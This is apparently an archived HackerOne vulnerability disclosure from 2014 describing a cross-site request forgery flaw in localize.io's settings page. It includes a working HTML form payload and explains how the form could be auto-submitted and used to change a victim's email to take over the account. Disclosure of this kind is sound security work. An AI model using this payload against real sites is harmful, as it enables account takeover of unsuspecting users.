# Change user settings through CSRF

## Metadata
- **Source:** HackerOne
- **Report:** 7870 | https://hackerone.com/reports/7870
- **Submitted:** 2014-04-17
- **Reporter:** guido
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hello,

it's trivial to change the user settings. Just use  this HTML code:

<html>
<head></head>
<body>
<form action="http://www.localize.io/pages/settings" method="post">
<input type="text" name="settings[realName]" value="otherusername">
<input type="submit" value="Submit">
</form>
</body>
</html>

In addition with some Javascript code that submits the form automatically, making t

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello,

it's trivial to change the user settings. Just use  this HTML code:

<html>
<head></head>
<body>
<form action="http://www.localize.io/pages/settings" method="post">
<input type="text" name="settings[realName]" value="otherusername">
<input type="submit" value="Submit">
</form>
</body>
</html>

In addition with some Javascript code that submits the form automatically, making the user visit the snipped of code above will change their user settings. If their e-mail address is altered too, and the adversary gets a verification e-mail after he changes the user's e-mail to his e-mail, it's easy to take over an account.

I also recommend enabling HTTPS and disallowing regular HTTP.

Greets

</details>

---
*Analysed by Claude on 2026-05-24*
